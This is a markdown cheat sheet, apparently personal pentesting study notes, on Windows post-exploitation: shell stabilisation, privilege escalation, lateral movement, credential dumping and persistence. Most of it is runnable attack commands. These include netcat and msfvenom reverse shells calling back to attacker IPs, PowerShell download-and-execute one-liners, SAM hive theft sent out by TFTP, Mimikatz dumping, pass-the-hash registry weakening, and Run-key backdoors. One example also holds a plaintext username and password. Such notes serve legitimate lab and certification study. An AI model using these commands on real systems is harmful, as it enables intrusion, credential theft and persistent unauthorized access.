
# Windows Post-Exploitation 

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md


--- 
<br>

### 0) Stabilizing the Shell

Use rwrap:
- rlwrap is a program that gives you access to history, tab autocompletion and the arrow keys immediately upon receiving a shell, however some manual stabilization must still be utilized if you want to be able to use Ctrl + C inside the shell
 - to install: `sudo apt install rlwrap`
 - to use: `rlwrap nc -lvnp <port>`
 - then to fully stablise on a Linux box: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell

Use Socat:
- use an initial netcat shell as a stepping stone into a more fully-featured socat shell
1. transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) onto the target machine
	- i.e. start a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80)`, then use the netcat shell on the target machine to download the file
	- on Windows you can use Powershell using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (i.e. `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`)
2. setup a listener on the attack machine: `socat TCP<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
3. connect to the listener from the target machine: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

<br>

 With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen:
1. open another terminal and run `stty -a` to get a rows and columns number
2. in your reverse/bind shell, change row size with `stty rows <number>` and column size with `stty cols <number>`, using the numbers you got from running the command in your own terminal
- this will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.


<br>

---

### 1) Privilege Escalation 

#### a) Enumeration 

**system and network information**
- meterpreter: 
	- `sysinfo`
	- `ifconfig`, `arp`, `route`
	- `run post/windows/gather/enum_domains`
	- `run post/windows/gather/enum_shares`
	- `run winenum`
- in shell: 
	- `ipconfig /all`, `arp`, `route`, `netstat -ano`
	- `net group "Domain Controllers" /domain`
	-  `net localgroup` to get a list of groups, then `net localgroup <group_name>`
	-  `net share`
	- `systeminfo`
	
**user information**
- meterpreter: 
	- `getuid`, `getprivs` -- if the right privilege then could use "juicy potato" exploits
	- `run post/windows/gather/enum_ad_users`
	- `run post/windows/gather/enum_ad_groups`
- shell: 
	- `net user`
	- `net user /domain`
	- `whoami`
	- `whoami /priv`
	
**group information**
- in shell: `net localgroup` or `net localgroup <group_name>`

**privileged access / cleartext credentials**
- meterpreter:
	- `run scraper`
	- `search -d <directory_to_search_from> -f <file_pattern>`)
		- i.e. `search -f *.kdb -r -d .`
	- `run post/windows/gather/credentials/*`
		- i.e. `run post/windows/gather/credentials/credential_collector
	- if Chrome installed: `run post/windows/gather/enum_chrome`
	- if FileZilla installed: `run post/multi/gather/filezilla_client_cred`
	
**services** 
- meterpreter: 
	- `ps` (or `ps -A <arch> -s` to specify architecture and SYSTEM processes only)
	- `run post/windows/gather/enum_services`
- in shell:
	- `wmic service get Caption,StartName,State,pathname` 
	- `net start`
	
**jobs/tasks**:
- ...

**installed software version information**
- meterpreter: `run post/windows/gather/enum_applications`

**shared resources**
- in shell: `net share`
- meterpreter: `run post/windows/gather/enum_shares`

<br>

Automated enumeration process:
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- metepreter's exploit suggester module: `run post/multi/recon/local_exploit_suggester`
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) PowerShell privilege escalation script 
- use [LOLBAS](https://lolbas-project.github.io/) to check (Living Off The Land Binaries and Scripts (and also Libraries))

<br>

Powershell file download:
- a) `powershell.exe 
Invoke-WebRequest -Uri <source> -OutFile <destination>`
- b) `powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('<url>'); Invoke-<name_of_powershell_script> -Thorough`
- c) `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat`

<br>

#### b) Exploitation 

**In Meterpreter**:
- migrate to stable process: `ps` (get process id) -> `migrate -N <pid>`
- automatically escalate privileges: `getsystem`
- if UAC is enabled:
	- a) verify UAC is enabled: `run post/windows/gather/win_privs`
	- b) run bypass module to get a new meterpreter session : `background` (current meterpreter session) -> `search bypassuac` -> `use exploit/windows/local/bypassuac_vbs`
	- c) run `getsystem` again

<br> 

**To bypass UAC manually**:
- a) create a payload:
	- i.e. `msfvenom -p windows/meterpreter/reverse_tcp -f exe -o shell.exe lhost=172.50.50.50 lport=1234`
- b) upload the exploit and payload to target host:
	- i.e. `upload usr/share/metasploit-framework/data/post/bypassuac-x64.exe` and `upload shell.exe` (to the compromised account home directory)
- c) use the bypass UAC exploit:
	- setup handler to catch shell: `use exploit/multi/hanlder` -> set options -> `run`
	- run exploit: `sessions -i 1` -> `shell` -> `bypass-x64.exe /c shell.exe`

<br> 

**Unquoted service paths**:
> https://gracefulsecurity.com/privesc-unquoted-service-path/
- exploits how Windows searches for an executable on the system
- a) drop into a shell from meterpreter: `shell`
- b) search fro service binary paths that are unquoted:
	- `wmic service,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
- c) once you find a binary with an unquoted service path, check if the current user can start/stop the service with the `sc` command:
	- i.e. `sc stop VGAuthService` -> `sc start VGAuthService`
- d) check what permissions your user account has to that directory (you need write)
	- i.e. `icacls "c:\Program Files\VMware\VMware Tools"`
- e) check what permissions that services runs as (you want "Local System")
	- i.e. go to Services -> find the service -> check the Log On As column
- d) stop the service 
	- i.e. `sc stop VGAuthService`
- e) upload a binary payload to the directory you are going to exploit on the machine
	- i.e. via meterpreter: background the current shell session (`Ctrl-Z`) -> `upload payload.exe "C:\\Program Files\\VMware\\VMware Tools\VMware.exe"`
	- the payload is renamed to `VMware.exe` on the machine 
- f) setup a handler to catch the new meterpreter shell the payload generates:
	-  i.e. background the current shell session (`Ctrl-Z`)  -> `use exploit/multi/handler` -> [set options to be the same as the payload binary] -> `exploit -j` (to start the handler in the background)
-  g) restart the service you originally stopped
	-  i.e. `shell` -> `sc start VGAuthService`
	- then you can background this session and switch to the new metepreter session (i.e. `background` -> `sessions -i 2`)
- h) if the new meterpreter session is unstable, you can set the `exploit/multi/handler` module to autorun a script to stabilize the shell before you begin interacting with it:
	- `use exploit/multi/handler` -> [set options] -> `set AutoRunScript migrate -n svchost.exe` -> `exploit -j`
	- this will run the migrate command as soon as the connection is established and migrate to an existing `scvhost.exe` process 
- 

<br>

**Windows credentials editor**:
- [WCE](https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/) (Windows Credential Editor) lets you work with Windows credentials, logon sessions, Kerberos, etc.
- `upload wce.exe .` -> `execute -i -f wce.exe -a -h` (to view help information)

<br>

**PrintSpoofer**:
- exploit that abuses impersonation privileges on Windows 10 and Server 2019
- can be used to esclated to root privileges if user has either `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` privileges
- check privileges with: `whoami /priv`
- download exploit from [here](https://github.com/dievus/printspoofer)
- upload the exploit and then execute: `PrintSpoofer.exe -i -c cmd` 

<br>

**DLL hijacking/preloading**:
- a) find applications vulnerable to DLL hijacking by searching for writeable directories where you can replace a loaded DLL
	- can use the Windows [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) tool (part of the SysInternals Suite) or Process Explorer for this:
	- i) create a procmon filters for a specific executable you want to investigate (i.e. `RegSrvc.exe`) and, also, create a filter for `NAME NOT FOUND` for the Result column so you can quickly filter on relevant entries:
	- ii)  identify cases where the application is looking for a DLL in a directory which you can write to, or modify
- b) drop your modified payload in the writeable directory (replacing the DLL)
- c) restart the Service, re-launch the application (or wait for the system to be rebooted if the executable is associated with a service that starts at boot time) or, alternatively, wait for the user to launch the affected application

**Windows XP SP0/SP1**:
> There is a local privilege escalation technique specific to Windows XP SP0/SP1 systems that gives you a root shell
- a) check `upnphost` service has "SSDPSRV" listed as DEPENENCIES
	- i.e. `sc qc upnphost`
- b) check `SSDPSRV` START_TYPE and change to AUTO_START
	- i.e. `sc qc SSDPSRV` -> `sc config SSDPSRV start= auto` -> `sc qc SSDPSRV`
- c) start `SSDPSRV` 
	- i.e. `net start SDPSRV`
- d) transfer netcat onto machine (can be found [here](https://eternallybored.org/misc/netcat/))
- e) set a new binary path to execute netcat and connect back to attack machine:
	- i.e. `sc config upnphost binpath= "C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe"`
- f) set object and password so service executes:
	- i.e. `sc config upnphost obj= ".\LocalSystem" password= ""`
- g) check service is set: `sc qc upnphost`
- h) start two netcat listeners (one for initial connection and one to create a table connection)
	- i.e. tab 1 = `nc -lvnp 4444`
	- i.e. tab 2 = `nc -lvnp 4445`
- i) start `upnphost` service:
	- i.e. `net start upnphost`
- j) immediately connect to a stable netcat connection once you get initial netcat shell:
	- i.e. `C:\nc.exe -nv 192.168.0.2 4445 -e C:\WINDOWS\System32\cmd.exe`	
- details can be found [here](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)


--- 

### 2) Lateral Movement 

Meterpreter **incognito** module:
- lets you impersonate other valid users tokens on a machine without needing to know/crack passwords
- `use incognito` -> `list_tokens` -> `impersonate_token <token>`

<br>
 
Pass The Hash (PtH):

- in Metasploit: `use exploit/windows/smb/psexec` -> `set SMBPass <password_hash>` -> `set SMBuser <username>` -> [set other options] ->  `run`
- with Impacket: `python3 /opt/impacket/examples/psexec.py <user>:<hash/password>@<ip>`
- i.e. `python3 /opt/impacket/examples/psexec.py sqlServer:shantewhite@10.11.1.121`
- sometimes being in the local administrators group is not enough to pass-the-hash, and depending on the Windows OS configuration/version, some changes may be required on the target system in order for this to work 
- these issues typically happen when trying to pass-the-hash from an account which isn't an "actual" administrator (RID-500) but, rather, from an account that is in the Adminstrators group 
- i.e. you will be presented with a `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` error if this is the case
- to get around this error registry changes may need to be made on the target host in order for a successful pass-the-hash attack
- two registry entries needed on the target system for this attack to be successful are:
	- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` -- add a new DWORD (32-bit) named **LocalAccountTokenFilterPolicy** and set its value to **1**
	- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters` -- add a new DWORD (32-bit) named **RequireSecuritySignature** and set its value to **0**
- these two changes can be made with the Powershell one-liners:
	- `PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord`
	- `PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord`
- or you can use the `reg` shell command:
	- `C:\> reg add "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`
	- `C:\> reg add "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f`
- these changes, particularly the **LocalAccountTokenFilterPolicy** setting, essentially allow non RID-500 user accounts (users in the local administrator group for instance) to successfully pass-the-hash in some cases

<br>

Active Directory lateral movement:
- see [[ActiveDirectory_attacks]]

<br>

Pivoting lateral movement:
- see [[pivoting]]

<br>

Run a command as another user:
- a) get another users credentials
- b) download netcat onto system
	- i.e.`Invoke-WebRequest "http://<kali_ip>/nc.exe" -OutFile "nc.exe"`
- c) setup a netcat listener 
- d) use PowerShell to launch a cmd.exe as another user and catch it:
	```powershell
	$username = '<user>'
	$password = '<password>'
	$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
	$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
	Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","<kali_ip>","80","-e","cmd.exe") -WorkingDirectory C:\Users\Public
	```
	
<br>

Move from local admin to NT SYSTEM:
- `PsExec.exe -i -s cmd.exe`

--- 

### 3) Data Exfiltration

To dump password hashes with meterpreter: 
- use: `hashdump` or `run post/windows/gather/smart_hashdump`
- then crack them offline with John The Ripper

To dump hashes with `samdump2`:
- a) save "sam" and "system" keys
	- `reg save hklm\sam c:\sam`
	- `reg save hklm\system c:\system`
- b) exfiltrate files (i.e. via TFTP)
	- see [[file_transfers]] and Windows TFTP upload section
	- i.e. `tftp -i 192.168.119.208 put sam`
- c) use `samdump2` to dump hashes:
	- i.e. `samdump2 system sam > hashes.txt`
- d) crack with John:
	- `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

To dump hashes with MimiKatz:
- a) load MimiKatz onto system and be SYSTEM user
- b) run `log hashes.txt` to create a log file to dump hashes to
- c) run `privilege::debug` to check you can dump hashes 
- d) dump hashes:
	- dump recently logged on user/service credentials with: `sekurlsa:logonpasswords`
	- dump AD domain credentials with `lsadump::lsa /patch`
	- dump local account credentials with: `lsadump::sam`
- see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md#mimikatz---lsa-protection-workaround) for more MimiKatz information



<br>

Meterpreter **kiwi** module:
- lets you dump credentials using Mimikatz
- `load kiwi` -> `help` (to view new commands available) -> `creds_all` (to retrieve all credentials)

<br>

Meterpreter upload/download files:
- `download <src> <destination>`
- `upload <src> <destination>`

<br>

Obtaining credentials with SessionGopher:
- SessionGopher is a tool (PowerShell script) which can be used to gather locally stored credentials by applications (i.e. SCP, WinSCP, Putty, RDP, etc.)  that can be used in the post-exploitation phase to laterally move around the internal network
- a) host SessionGopher on attacker machine: `sudo python3 -m http.server 80`
- b) download and run SessionGopher via PowerShell on target machine:
	- `powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString('http://<attacker_ip>/SessionGopher.ps1'); Invoke-SessionGopher -Thorough`
	- you can omit the `-Thorough` option if you want SessionGopher to run faster

<br>

--- 

### 4) Maintaining Access & Persistence

**Enable RDP service**:
- a) check if RDP is enabled: `net start`
	- or `wmic service where 'Caption like "Remote%" and started=true' get Caption`
	- or in metepreter: `run service_manager -l` or `run post/windows/gather/enum_services`
- b) if disabled, enabled it:
	- in meterpreter: `run getgui -e` to just enable RDP, or you can use the `-p` and `-u` options to add a new user and password for the RDP service
- c) check if Remote Desktop Users can login to RDP:
	- the "Allow log on through Remote Desktop Services" policy needs to be assigned to the Remote Desktop Users group) -- this might not be the case if the machine is hardened
- d) add user to the Remote Desktop Users group:
	- in Windows shell: `net localgroup "Remote Desktop Users" <user> /add` where `Remote Desktop Users` is the name of the group you want to add *\<user\>*  to
	- check if successful with:  `net localgroup "Remote Desktop Users"` to list users in the RDP group
- e) login to RDP: `rdesktop <ip_address> -u <username> -p <password>`
	- or with Remmina
	- or `xfreerdp /u:<username> /p:<password> /v:MACHINE_IP`

<br>

**Create a backdoor**:
- automatic backdoor  in Metepreter:
	- `run persistence -h` -- the script lets you choose where to upload the file, which payload to use, the interval between each connection attempt, and how to start the backdoor
	- i.e. `run peristence -A -X -i 5 -p 8080 -r 192.168.102.12`
	-  the `-A` option starts the handler on your machine, `-X` starts the agent at boot (this requires SYSTEM privileges on the machine), `-i 5` specifies a connection attempt every 5 seconds, `p 8080` is the port to connect back to, and `-r <ip_address>` is your IP address
	- the script will automatically create the backdoor, upload it, and set the registry keys to start it at boot 
	- once the process is complete, if you want to get a session on the target machine, you can start a listener and wait for incoming connections: `use exploit/multi/handler` -> [set the same options as with the persistence script] -> `run`
- manual backdoor with msfvenom:
	- a) create a backdoor payload with msfvenom
	- b) upload the file to the victim machine: `upload <path/to/backdoor> <path/on/target>` 
		- i.e. `upload /root/my_bd.exe C:\\windows\`
	- c) edit the Windows Registry Key with the `reg` command to load the file at startup: `reg setval -k <registry/key/path> -d <value_of_the_key> -v <name_of_the_key>`
		- i.e. `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\my_bd.exe" -v bd_name`
	
<br> 

**Add a new user**:
- in a shell: `net user <username> <password> /add` -> `net localgroup "Administrators" <username> /add`
- once you create a new user for yourself, you have to join groups that allow you access to services such as RDP, Telnet, etc. 

<br>

**Dump hashes**:
- load MimiKatz
- run `privilege::debug`





